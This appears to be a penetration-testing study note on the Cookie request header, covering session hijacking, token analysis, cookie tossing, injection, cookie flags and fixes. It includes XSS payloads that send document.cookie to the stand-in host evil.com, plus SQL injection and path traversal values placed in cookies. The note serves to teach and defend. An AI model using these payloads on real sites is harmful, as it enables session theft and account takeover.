---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.17 Cookie — Session Hijacking, Flag Abuse"
portswigger_labs: ["Session token lab", "Cookie flags labs"]
---

# 03.17 — Cookie (Request Header)

## What is it?

The `Cookie` request header sends stored cookies back to the server. Browsers automatically include all matching cookies with every request. Session tokens are typically stored in cookies, making them the primary target for session hijacking attacks.

---

## Cookie Structure (Request vs Response)

```
SERVER SETS (response):
  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Domain=.target.com

BROWSER SENDS BACK (request):
  Cookie: session=abc123; pref=dark; cart=xyz789

Multiple cookies are semicolon-separated in one header.
```

---

## Attack 1: Session Hijacking via XSS

```
PRECONDITION: Cookie lacks HttpOnly flag
SESSION COOKIE: session=abc123  (HttpOnly NOT set)

ATTACK via XSS:
  <script>
    document.location = 'https://evil.com/steal?c=' + document.cookie;
  </script>

  OR:
  fetch('https://evil.com/?c=' + document.cookie)

RESULT: Attacker gets victim's session → full account takeover!

FIX: Always set HttpOnly flag on session cookies.
```

---

## Attack 2: Session Token Analysis

```
Tools to analyze randomness of session tokens:

BURP SUITE SEQUENCER:
1. Intercept login response with Set-Cookie
2. Right-click → Send to Sequencer
3. Start live capture → 100+ tokens
4. Analyze → check entropy score
5. Low entropy = predictable token!

If tokens follow patterns:
  session=user_1001  → just increment! IDOR via cookie!
  session=base64(username:timestamp) → decode and forge!
  session=MD5(username) → hash crackable!
```

---

## Attack 3: Cookie Tossing (Domain Scope Abuse)

```
SCENARIO:
  app.target.com sets cookie for Domain=.target.com
  All subdomains (*.target.com) send this cookie!

If attacker controls a subdomain (subdomain takeover or XSS):
  → Set cookie from evil.sub.target.com for Domain=.target.com
  → Overwrites or poisons legitimate cookie!

COOKIE TOSSING ATTACK:
  - Set same-name cookie from subdomain
  - Victim sends BOTH cookies to main app
  - App uses first or last depending on implementation
  → Session fixation possible!
```

---

## Attack 4: Cookie Injection

```
If cookie value is used in server-side operations:
  Cookie: user=admin' OR '1'='1   → SQLi!
  Cookie: theme=../../etc/passwd  → path traversal!
  Cookie: id=1; id=2             → cookie confusion!

Fuzz ALL cookie values, not just session cookies!
```

---

## Cookie Flags Reference

```
HttpOnly:      JavaScript cannot read document.cookie
               → Prevents XSS cookie theft (but not network interception)

Secure:        Cookie only sent over HTTPS
               → Prevents network interception
               → Without this → SSL stripping leaks cookie!

SameSite=Strict: Never sent on cross-site requests
                 → Strongest CSRF protection

SameSite=Lax:    Sent on top-level GET navigations (link clicks)
                  → Default in modern browsers
                  → Protects against most CSRF, but GET CSRF still possible

SameSite=None:   Sent on all cross-site requests (must have Secure)
                  → Required for third-party cookies

Path=/admin:     Cookie only sent for /admin paths
Domain=.target.com: Cookie sent to all subdomains!
```

---

## Testing Cookies with Burp

```bash
# View all cookies in Burp Proxy → HTTP history → response headers
# Check Set-Cookie for missing flags

# Check HttpOnly: can you read it in browser console?
# Open DevTools → Console → document.cookie
# If session cookie appears → HttpOnly missing!

# Check Secure flag:
curl http://target.com/  # non-HTTPS
# Is cookie sent? → Secure flag not set!

# Analyze session token quality:
# Burp → Proxy history → right-click response → Send to Sequencer

# Try session token manipulation:
# Decode base64: echo "session_value" | base64 -d
# Check if predictable or contains user data
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| No HttpOnly → XSS cookie theft | Add HttpOnly to all session cookies |
| No Secure → network interception | Add Secure to all session cookies |
| SameSite=None → CSRF | Use SameSite=Strict or Lax |
| Weak session tokens | Use cryptographically random 128+ bit tokens |
| Cookie value used in SQL/paths | Never use cookie values directly in backend operations |

---

## Related Notes
- [[02.11 - Cookies Structure Flags Lifecycle]] — full cookie lifecycle
- [[02.12 - Sessions How Server-Side Sessions Work]] — session mechanics
- [[47 - Set-Cookie flags]] — response side (Set-Cookie)
- [[Module 02 - XSS]] — XSS for cookie theft
- [[Module 07 - CSRF]] — SameSite flag for CSRF protection
